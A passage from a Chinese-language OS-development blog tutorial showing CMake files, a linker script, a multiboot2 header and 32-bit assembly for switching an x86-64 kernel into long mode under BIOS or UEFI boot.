class="hljs-variable">$&#123;PROJECT_SOURCE_DIR&#125;</span>/<span class="hljs-keyword">include</span>)<br><br><span class="hljs-comment"># seperate module</span><br><span class="hljs-keyword">add_subdirectory</span>(arch)<br><span class="hljs-keyword">add_subdirectory</span>(kernel)<br><br><span class="hljs-comment"># we create an empty file for add_executable(), as it must need at least one file to work</span><br><span class="hljs-keyword">file</span>(WRITE <span class="hljs-string">&quot;$&#123;CMAKE_CURRENT_BINARY_DIR&#125;/internal_empty_file_for_occupation_only.cpp&quot;</span> <span class="hljs-string">&quot;&quot;</span>)<br><span class="hljs-keyword">add_executable</span>(kernel.bin <span class="hljs-string">&quot;$&#123;CMAKE_CURRENT_BINARY_DIR&#125;/internal_empty_file_for_occupation_only.cpp&quot;</span>)<br><br><span class="hljs-comment"># final output</span><br><span class="hljs-keyword">target_link_libraries</span>(kernel.bin<br>    PRIVATE<br>        Arch<br>        Kernel<br>)<br><br></code></pre></td></tr></table></figure><p><code>include</code> 目录下是用于各个子系统的各种头文件，与 multiboot2 规范相关的一些定义放在 <code>include/boot/multiboot2.h</code> 中，该头文件来自于<a href="https://www.gnu.org/software/grub/manual/multiboot2/html_node/multiboot2_002eh.html">Multiboot 2 spec</a>，比较长，这里就不贴出来了</p><p>内核主体放在 <code>kernel</code> 目录下，其中 <code>kernel/CMakeLists.txt</code> 编写如下，目前暂时就只是添加当前文件夹下文件链接为 <code>Kernel</code> ：</p><figure class="highlight cmake"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs cmake"><span class="hljs-keyword">set</span>(TARGET_NAME Kernel)<br><span class="hljs-keyword">set</span>(SOURCE_FILE)<br><br><span class="hljs-keyword">file</span>(GLOB SOURCE_FILE <span class="hljs-string">&quot;$&#123;CMAKE_CURRENT_SOURCE_DIR&#125;/*.cpp&quot;</span><br>                      <span class="hljs-string">&quot;$&#123;CMAKE_CURRENT_SOURCE_DIR&#125;/*.c&quot;</span>)<br><br><span class="hljs-keyword">if</span>(SOURCE_FILE)<br>    <span class="hljs-keyword">add_library</span>(<span class="hljs-variable">$&#123;TARGET_NAME&#125;</span> <span class="hljs-string">&quot;&quot;</span>)<br>    <span class="hljs-keyword">target_sources</span>(<span class="hljs-variable">$&#123;TARGET_NAME&#125;</span> PUBLIC <span class="hljs-variable">$&#123;SOURCE_FILE&#125;</span>)<br><span class="hljs-keyword">else</span>()<br>    <span class="hljs-keyword">add_library</span>(<span class="hljs-variable">$&#123;TARGET_NAME&#125;</span> INTERFACE)<br><span class="hljs-keyword">endif</span>()<br><br></code></pre></td></tr></table></figure><p><code>kernel/main.c</code> 暂时就先放一个空的函数， <em>本篇博客暂时还用不到这块</em> ：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(<span class="hljs-type">void</span>)</span><br>&#123;<br>    <span class="hljs-comment">// do nothing</span><br>&#125;<br></code></pre></td></tr></table></figure><p><code>arch</code> 目录下是与架构相关的代码，目前暂时还是只支持 x86，不过后续如果有机会的话笔者希望能够让他在更多架构上跑起来，所以这里设计了一个通用的 <code>CMakeLists.txt</code>：</p><figure class="highlight cmake"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs cmake"><span class="hljs-keyword">set</span>(TARGET_NAME Arch)<br><br><span class="hljs-keyword">add_library</span>(<span class="hljs-variable">$&#123;TARGET_NAME&#125;</span> INTERFACE)<br><br><span class="hljs-comment"># check for current architecture</span><br><span class="hljs-keyword">if</span> (CMAKE_HOST_SYSTEM_PROCESSOR <span class="hljs-keyword">STREQUAL</span> <span class="hljs-string">&quot;x86_64&quot;</span>)<br>    <span class="hljs-keyword">add_subdirectory</span>(x86)<br>    <span class="hljs-keyword">target_link_libraries</span>(<span class="hljs-variable">$&#123;TARGET_NAME&#125;</span><br>        INTERFACE<br>            X86)<br><span class="hljs-keyword">else</span>()<br>    <span class="hljs-keyword">message</span>(FATAL_ERROR <span class="hljs-string">&quot;Only support x86_64 now&quot;</span>)<br><span class="hljs-keyword">endif</span>()<br><br></code></pre></td></tr></table></figure><p><code>arch/x86/CMakeLists.txt</code> 主要就是编译汇编和 C 文件以及启动阶段临时用的字体文件放到 <code>out/arch</code> 目录下，这里我们将启动阶段所需的代码都放在 <code>arch/x86/boot</code> 目录下：</p><figure class="highlight cmake"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs cmake"><span class="hljs-keyword">set</span>(TARGET_NAME X86)<br><span class="hljs-keyword">set</span>(SOURCE_FILE)<br><br><span class="hljs-keyword">include_directories</span>(<span class="hljs-keyword">include</span>)<br><br><span class="hljs-keyword">add_subdirectory</span>(boot)<br><br><span class="hljs-keyword">file</span>(GLOB SOURCE_FILE <span class="hljs-string">&quot;$&#123;CMAKE_CURRENT_SOURCE_DIR&#125;/*.cpp&quot;</span><br>                      <span class="hljs-string">&quot;$&#123;CMAKE_CURRENT_SOURCE_DIR&#125;/*.c&quot;</span>)<br><br><span class="hljs-keyword">if</span>(SOURCE_FILE)<br>    <span class="hljs-keyword">add_library</span>(<span class="hljs-variable">$&#123;TARGET_NAME&#125;</span> <span class="hljs-string">&quot;&quot;</span>)<br>    <span class="hljs-keyword">target_sources</span>(<span class="hljs-variable">$&#123;TARGET_NAME&#125;</span> PUBLIC <span class="hljs-variable">$&#123;SOURCE_FILE&#125;</span>)<br>    <span class="hljs-keyword">target_link_libraries</span>(<span class="hljs-variable">$&#123;TARGET_NAME&#125;</span> PUBLIC Boot)<br><span class="hljs-keyword">else</span>()<br>    <span class="hljs-keyword">add_library</span>(<span class="hljs-variable">$&#123;TARGET_NAME&#125;</span> INTERFACE)<br>    <span class="hljs-keyword">target_link_libraries</span>(<span class="hljs-variable">$&#123;TARGET_NAME&#125;</span> INTERFACE Boot)<br><span class="hljs-keyword">endif</span>()<br><br></code></pre></td></tr></table></figure><p><code>arch/x86/boot/CMakeLists.txt</code> 则就只是简单地编译当前目录的代码：</p><figure class="highlight cmake"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs cmake"><span class="hljs-keyword">set</span>(TARGET_NAME Boot)<br><span class="hljs-keyword">set</span>(SOURCE_FILE)<br><br><span class="hljs-keyword">file</span>(GLOB SOURCE_FILE <span class="hljs-string">&quot;$&#123;CMAKE_CURRENT_SOURCE_DIR&#125;/*.S&quot;</span><br>                      <span class="hljs-string">&quot;$&#123;CMAKE_CURRENT_SOURCE_DIR&#125;/*.c&quot;</span><br>                      <span class="hljs-string">&quot;$&#123;CMAKE_CURRENT_SOURCE_DIR&#125;/boot_font.o&quot;</span>)<br><br><span class="hljs-keyword">if</span>(SOURCE_FILE)<br>    <span class="hljs-keyword">add_library</span>(<span class="hljs-variable">$&#123;TARGET_NAME&#125;</span> <span class="hljs-variable">$&#123;SOURCE_FILE&#125;</span>)<br><span class="hljs-keyword">else</span>()<br>    <span class="hljs-keyword">message</span>(FATAL_ERROR <span class="hljs-string">&quot;no source files provided for boot&quot;</span>)<br><span class="hljs-keyword">endif</span>()<br><br></code></pre></td></tr></table></figure><h2 id="linker-lds：链接脚本"><a href="#linker-lds：链接脚本" class="headerlink" title="linker.lds：链接脚本"></a>linker.lds：链接脚本</h2><blockquote><p>什么，你不知道什么事链接脚本？还不<a href="https://ftp.gnu.org/old-gnu/Manuals/ld-2.9.1/html_chapter/ld_3.html">赶快学</a>！</p></blockquote><p>链接脚本用来指示我们的内核可执行文件各个段的布局，例如不同的段的加载地址，在操作系统开发中有个不成文的约定就是将内核加载到物理内存 1M 起始，因此我们需要在链接脚本中将我们的引导部分放到这个位置，同时作为一个不成文的规范，<strong>内核应当被装载到高地址处</strong>，那么我们的内核应当分为如下两大部分：</p><ul><li>boot：由 GRUB 引导，负责进行页表重映射、内存管理初始化等预备工作，完成后跳转至内核</li><li>kernel：实际的内核主体，位于虚拟地址的高地址处</li></ul><p>笔者选择将 boot 阶段的所有代码全都放在开头为 <code>.boot</code> 的段当中，将 kernel 的 <code>.text</code> 等段重新从高地址处计算起始地址，因此链接脚本如下：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br></pre></td><td class="code"><pre><code class="hljs ld">OUTPUT_FORMAT(&quot;elf64-x86-64&quot;)<br>OUTPUT_ARCH(i386:x86-64)<br>ENTRY(_start)<br><br>SECTIONS<br>&#123;<br>    /* boot loader will load the kernel there */<br>    . = 1M;<br>__boot_start = .;<br><br>/* ASM boot-state kernel */<br><br>    .boot.loader :<br>&#123;<br>KEEP(*(.boot.header))<br>*(.boot.*)<br>arch/x86/boot/libBoot.a<br>&#125;<br><br>. = ALIGN(4096);<br><br>/* C boot-state kernel */<br><br>.boot.text ALIGN(4096) :<br>&#123;<br>arch/x86/boot/libBoot.a(.text)<br>&#125;<br><br>. = ALIGN(4096);<br><br>.boot.rodata ALIGN(4096) :<br>&#123;<br>arch/x86/boot/libBoot.a(.rodata)<br>&#125;<br><br>. = ALIGN(4096);<br><br>.boot.data ALIGN(4096) :<br>&#123;<br>arch/x86/boot/libBoot.a(.data)<br>arch/x86/boot/libBoot.a(.*)<br>&#125;<br><br>. = ALIGN(4096);<br><br>__boot_end = .;<br><br>/* now we come to the REAL kernel */<br><br>KERM_VADDR = 0xffffffff81000000;<br>. = KERM_VADDR;<br><br>/* we use AT() there to make it loaded on phys correctly */<br>.text ALIGN(4096) : AT (ADDR (.text) - KERM_VADDR + __boot_end)<br>&#123;<br>*(.text)<br>&#125;<br><br>. = ALIGN(4096);<br><br>.rodata ALIGN(4096) : AT (ADDR (.rodata) - KERM_VADDR + __boot_end)<br>&#123;<br>*(.rodata)<br>&#125;<br><br>. = ALIGN(4096);<br><br>__roseg_end = .;<br><br>.data ALIGN(4096) : AT (ADDR (.data) - KERM_VADDR + __boot_end)<br>&#123;<br>*(.data)<br>&#125;<br><br>. = ALIGN(4096);<br><br>.bss ALIGN(4096) : AT (ADDR (.bss) - KERM_VADDR + __boot_end)<br>&#123;<br>*(COMMON)<br>*(.bss)<br>&#125;<br><br>. = ALIGN(4096);<br><br>__kernel_end = .;<br>&#125;<br></code></pre></td></tr></table></figure><h2 id="boot-S：BIOS-UEFI-兼容-32-位汇编入口，跳转进入-64-位-C-语言"><a href="#boot-S：BIOS-UEFI-兼容-32-位汇编入口，跳转进入-64-位-C-语言" class="headerlink" title="boot.S：BIOS &amp; UEFI 兼容 32 位汇编入口，跳转进入 64 位 C 语言"></a>boot.S：BIOS &amp; UEFI 兼容 32 位汇编入口，跳转进入 64 位 C 语言</h2><p><code>arch/x86/boot.S</code> 中则是我们实际的内核入口点，因为对于实现 multiboot 规范的内核而言 <strong>没必要在汇编下进行绝大部分系统功能的实现</strong> ，所以这个文件的核心功能就 <strong>仅是完成部分必须的准备工作并快速进入 C 语言部分</strong></p><p>我们的 multiboot2 header 也可以放在这个地方，这里除了最基本的结构以外笔者还引入了一个指示入口点的 tag，以及一个指示让 GRUB 帮我们设置好指定大小的 frame buffer 的 tag，GRUB2 会根据这个 tag 自动帮我们设置显示模式：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><code class="hljs assembly">#define ASM_FILE 1<br>#include &lt;boot/multiboot2.h&gt;<br>#include &lt;asm/cpu_types.h&gt;<br>#include &lt;asm/page_types.h&gt;<br><br>#define GRUB_MULTIBOOT_ARCHITECTURE_I386 (0)<br>#define MULTIBOOT2_HEADER_LEN (multiboot_header_end - multiboot_header)<br>#define MULTIBOOT2_HEADER_CHECKSUM \<br>    -(MULTIBOOT2_HEADER_MAGIC \<br>    + GRUB_MULTIBOOT_ARCHITECTURE_I386 \<br>    + MULTIBOOT2_HEADER_LEN)<br><br>.section .boot.loader.header<br>    .align 8<br><br>    multiboot_header:<br>        .long   MULTIBOOT2_HEADER_MAGIC<br>        .long   GRUB_MULTIBOOT_ARCHITECTURE_I386<br>        .long   MULTIBOOT2_HEADER_LEN<br>        .long   MULTIBOOT2_HEADER_CHECKSUM<br><br>    tag_entry:<br>        .align 8<br>        .short MULTIBOOT_HEADER_TAG_ENTRY_ADDRESS<br>        .short 0<br>        .long 12<br>        .long _start<br>    <br>    tag_frame_buffer:<br>        .align 8<br>        .short MULTIBOOT_HEADER_TAG_FRAMEBUFFER<br>        .short 0<br>        .long 20<br>        .long 1024<br>        .long 768<br>        .long 32<br><br>    tags_end:<br>        .align 8<br>        .short  MULTIBOOT_HEADER_TAG_END<br>        .short  0<br>        .long   8<br>    multiboot_header_end:<br></code></pre></td></tr></table></figure><p>ELF 文件默认的入口点是 <code>_start</code> 函数，因此我们在这里声明一个 <code>_start</code> 函数并导出该符号，从而使得 GRUB 在完成内核的装载之后会从此处开始执行，不过我们也可以通过在 header 中添加一个 <code>entry address tag</code> 来为 GRUB 指定我们的内核入口点：</p><p>不过在正式开始之前，我们首先看看当前的机器状态，这里笔者打算<strong>同时兼容 Legacy BIOS 启动与 UEFI 启动</strong>，因此这两种机器状态我们都得看看如何处理</p><h3 id="①-Legacy-BIOS-启动"><a href="#①-Legacy-BIOS-启动" class="headerlink" title="① Legacy BIOS 启动"></a>① Legacy BIOS 启动</h3><p>当我们使用 Legay BIOS 启动遵循 Multiboot2 规范的 32 位内核时，在进入内核时机器应当有如下<a href="https://www.gnu.org/software/grub/manual/multiboot2/multiboot.html#Machine-state">状态</a>：</p><ul><li><code>eax</code>：必定为 Magic Number <code>0x36d76289</code>，该值的存在表明其为符合 multiboot2 标准的引导程序加载的</li><li><code>ebx</code>：必定为引导加载程序提供的 Multiboot2 信息结构的 32 位物理地址（参见<a href="https://www.gnu.org/software/grub/manual/multiboot2/multiboot.html#Boot-information-format">这里</a>）</li><li><code>cs</code>：权限为 <code>读|执行</code>，偏移为 <code>0</code>，界限为 <code>0xFFFFFFFF</code></li><li><code>ds、es、fs、gs、ss</code>：权限为 <code>读|写</code>，偏移为 <code>0</code>，界限为 <code>0xFFFFFFFF</code></li><li><code>A20 gate</code>：已开启</li><li><code>cr0</code>：分页（PG）关闭，保护模式（PE）开启</li><li><code>eflags</code>：VM、IF 两个位清空</li></ul><p>剩下的工作都需要我们的内核自行完成，包括段描述符表的设置、堆栈、中断描述符表的设置等</p><h3 id="②-UEFI-启动"><a href="#②-UEFI-启动" class="headerlink" title="② UEFI 启动"></a>② UEFI 启动</h3><p>当我们使用 UEFI 启动遵循 Multiboot2 规范的 32 位内核时，在进入内核时机器应当有如下<a href="https://www.gnu.org/software/grub/manual/multiboot2/multiboot.html#Machine-state">状态</a>：</p><ul><li><code>eax</code>：必定为 Magic Number <code>0x36d76289</code>，该值的存在表明其为符合 multiboot2 标准的引导程序加载的</li><li><code>ebx</code>：必定为引导加载程序提供的 Multiboot2 信息结构的 32 位物理地址</li></ul><p>根据 <a href="https://uefi.org/sites/default/files/resources/UEFI%20Spec%202_6.pdf">UEFI 规范 v2.6</a> 第 2.3.2 节，此时机器有如下状态：</p><ul><li>单处理器模式（Uniprocessor，仅有一个核心被唤醒，参见 <a href="https://www.intel.com/content/www/us/en/developer/articles/technical/intel-sdm.html">Intel SDM</a> 卷 3）</li><li>处在保护模式下</li><li><strong>可能</strong>开启了分页，若是，则 UEFI 内存映射定义的任何内存空间都是恒等映射的（虚拟地址等于物理地址），对其他区域的映射是未定义的，可能因实现而异</li><li>选择子（selector）设为“平坦模式”（flat model）或未使用</li><li>中断开启，不过仅支持 UEFI 引导服务计时器（所有加载的设备驱动都通过“轮询”进行同步服务）</li><li>EFLAGS 中的方向标志位被清除</li><li>其他通用标志寄存器未定义</li><li>128 KB 或更多的可用栈空间</li><li>栈为 16 字节对齐，可能在页表中被标记为不可执行</li><li><code>floating-point control word</code> 被初始化为 <code>0x027F</code>（all exceptions masked, double-extended-precision, round-to-nearest）</li><li><code>Multimedia-extensions control word</code> 被初始化为 <code>0x1F80</code> (all exceptions masked, roundto-nearest, flush to zero for masked underflow)</li><li><code>CR0.EM == 0</code></li><li><code>CR0.TS == 0</code></li></ul><blockquote><p>选择子的平坦模式示意如下：</p><p><img src="https://cdn.jsdelivr.net/gh/rat3bant/BlogPic@master/20231115220200.png"></p></blockquote><h3 id="③-初始化栈与临时页表"><a href="#③-初始化栈与临时页表" class="headerlink" title="③ 初始化栈与临时页表"></a>③ 初始化栈与临时页表</h3><p>我们不难看出 BIOS 启动与 UEFI 启动后的机器状态在 32 位下差别并不大，大家都在保护模式下，只是 UEFI 启动<strong>可能</strong>会额外多一个栈和页表的配置，不过我们完全可以 <em>抛弃 UEFI 帮我们预设好的页表与栈，自己从头开始初始化一个</em></p><p>首先是页表的初始化，由于现在尚未完成内存管理器的构建，因此笔者选择仅构建一个临时的页表，待到进入 64 位长模式完成内存探测与内存分配器的建立之后再重新建立一个正式的新页表，64 位模式下所用的通常是四级页表，虚拟地址有效长度为 48 位，在控制寄存器组（control registers）中的 CR3 寄存器中存放顶层页表的地址：</p><p><img src="https://cdn.jsdelivr.net/gh/rat3bant/BlogPic@master/20231115214456.png"></p><blockquote><p>页表所使用的模式由 CR4 寄存器决定，具体可以参见 Intel SDM 的 3102 页 4.1.1 Four Paging Modes</p></blockquote><p>不过启动阶段若是我们的临时页表也采用 4 级页表的结构的话，或许会需要占用过多的内存空间来保证对所有内存的映射，因为这个页表只是在内存管理器建立起来之前临时一用，因此这里我们使用 <strong>1GB 的大页</strong>，这样只需要两张页面组成的二级页表便能撑起我们初期所需的所有的内存空间，<strong>待到完成最基本的内存管理器的初始化之后再重新进行页表的动态初始化</strong></p><p><img src="https://cdn.jsdelivr.net/gh/rat3bant/BlogPic@master/20231127203951.png"></p><p>1 GB 大页的开启需要我们进入 64 位，并在页表项中设置 <code>PS</code> 位，此外，进入 64 位模式要求我们启用<strong>物理地址扩展</strong>（Physical Address Extension），这项特性将页表项从 4 字节扩展为 8 字节，我们需要在进入 64 位之前通过设置 CR4 寄存器的 PAE 位来启用该特性，并在提前在预先准备好的二级页表中设置 <code>PS</code> 位</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br></pre></td><td class="code"><pre><code class="hljs assembly">.section .boot.loader.text32:<br>    .code32<br>    .align 0x1000<br>    .extern boot_main<br><br>    .globl _start<br><br>    _start:<br>        # turn off the interrupt temporarily,<br>        # and we should turn it on after our own IDT has been built.<br>        cli<br><br>        # check for multiboot2 header<br>        cmp $MULTIBOOT2_BOOTLOADER_MAGIC, %eax<br>        jne .loop<br><br>        # temporary stack<br>        mov     $boot_stack_top, %esp<br><br>        # set the boot information as parameters for boot_main()<br>        mov     %eax, %edi<br>        mov     %ebx, %esi<br><br>        # clear eflags<br>        pushl   $0<br>        popf<br><br>        # disable paging (UEFI may turn it on)<br>        mov     %cr0, %eax<br>        mov     $CR0_PG, %ebx<br>        not     %ebx<br>        and     %ebx, %eax<br>        mov     %eax, %cr0<br><br>        # set up page table for booting stage<br>        # it&#x27;s okay to write only 32bit here :)<br>        mov     $boot_pud, %eax<br>        or      $(PAGE_ATTR_P | PAGE_ATTR_RW), %eax<br>        mov     %eax, boot_pgd<br><br>        xor     %eax, %eax<br>        or      $(PAGE_ATTR_P | PAGE_ATTR_RW | PAGE_ATTR_PS), %eax<br>        movl    %eax, boot_pud<br><br>        xor     %eax, %eax<br>        mov     %eax, (boot_pgd + 4)<br>        mov     %eax, (boot_pud + 4)<br><br>        # load page table<br>        mov     $boot_pgd, %eax<br>        mov     %eax, %cr3<br><br>#......<br><br>.section .boot.loader.data<br>    .align 0x1000<br><br>    .globl boot_stack, boot_stack_top<br><br>    #<br>    # When the system is booted under legacy BIOS, there&#x27;s no stack<br>    # So we reserve a page there as a temporary stack for booting<br>    #<br>    boot_stack:<br>        .space 0x1000<br>    boot_stack_top:<br><br>    boot_pgd:<br>        .space 0x1000<br>    boot_pud:<br>        .space 0x1000<br><br></code></pre></td></tr></table></figure><h3 id="④-进入-64-位模式"><a href="#④-进入-64-位模式" class="headerlink" title="④ 进入 64 位模式"></a>④ 进入 64 位模式</h3><p>64 位运行模式（Intel 称为 <code>IA-32e mode</code>，AMD 称为 <code>long mode</code>）是进入 64 位时代后 x64 处理器引入的<strong>新的运行模式</strong>，其有着两个子模式：</p><ul><li>兼容模式（Compatibility mode）：传统的 16&#x2F;32 位应用程序仍能正常运行，类似于 32 位保护模式，其使用 16&#x2F;32 位地址与操作数，仅能访问线性地址空间的前 4 GB，通过 PAE 可以访问更多的物理内存</li><li>纯 64 位模式（64-bit mode）：该模式下可以访问 64 位线性地址空间， <em>通常</em> 不再使用分段，通用寄存器与 SIMD 扩展寄存器从 8 个扩展至 16 个，通用寄存器扩展至 64 位，默认地址大小为 64 位，默认操作数大小为 32 位，新增的 opcode 前缀 <code>REX</code> 用以进行 64 位下的扩展访问</li></ul><p><img src="https://cdn.jsdelivr.net/gh/rat3bant/BlogPic@master/20231129170947.png"></p><blockquote><p>参见 Intel SDM 卷 1 Chapter 3、卷 3A Chapter 2 与 AMD64 PM 卷 1 Chapter 2、卷 2 Chapter 1</p><blockquote><p><del>翻大砖头全英手册真给👴整麻了</del></p></blockquote></blockquote><p>简而言之就是进入 64 位模式之后正常运行 64 位应用就在纯 64 位模式，但也可以通过兼容模式来像 32 位保护模式那样运行以前的 32 位应用，这两种子模式间的切换<strong>通过 CS 段选择子对应的段描述符的 L 位决定</strong>：</p><p><img src="https://cdn.jsdelivr.net/gh/rat3bant/BlogPic@master/20231129171602.png" alt="AMD64 处理器运行模式切换"></p><p>我们的 64 位操作系统自然是运行在纯 64 位这一子模式下的，而 GRUB 引导进入我们的内核时我们仍处于 32 位模式下，因此我们需要编写 32 位汇编来将处理器切换到 64 位模式，具体需要进行如下工作：</p><ul><li>将 **Model Specific Register **这一寄存器组中的 <strong>Extended Feature Enable Register</strong> 寄存器的 LME 位置为 1（参见 Intel SDM 卷 3 A Chapter 2 的 2.2.1 节，Table 2-1）</li><li>配置好相应的全局段描述符表，并将 CS 段选择子对应的段描述符的 L 位置为 1</li><li>开启控制寄存器组中 CR4 寄存器的 <strong>物理地址扩展</strong>（Physical Address Extension）</li><li>开启控制寄存器组中 CR0 寄存器的 <strong>分页</strong>（Paging），这要求我们预先装载一份页表</li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><code class="hljs assembly">        # enable PAE and PGE<br>        mov     %cr4, %eax<br>        or      $(CR4_PAE | CR4_PGE), %eax<br>        mov     %eax, %cr4<br><br>        # enter long mode by enabling EFER.LME<br>        mov     $0xC0000080, %ecx<br>        rdmsr<br>        or      $(1 &lt;&lt; 8), %eax<br>        wrmsr<br><br>        # enable paging<br>        mov     %cr0, %eax<br>        or      $CR0_PG, %eax<br>        mov     %eax, %cr0<br><br>        # set up GDT<br>        mov     $gdt64_ptr, %eax<br>        lgdt    0(%eax)<br><br>#......<br><br>.section .boot.loader.data<br>    #......<br><br>    # global segment descriptor table<br>    .align 0x1000   # it should be aligned to page<br>    .globl gdt64, gdt64_ptr<br>    gdt64:<br>        .quad 0 # first one must be zero<br>    gdt64_code_segment:<br>        .quad 0x00209A0000000000 # exec/read<br>    gdt64_data_segment:<br>        .quad 0x0000920000000000 # read/write<br>    gdt64_ptr:<br>        .short 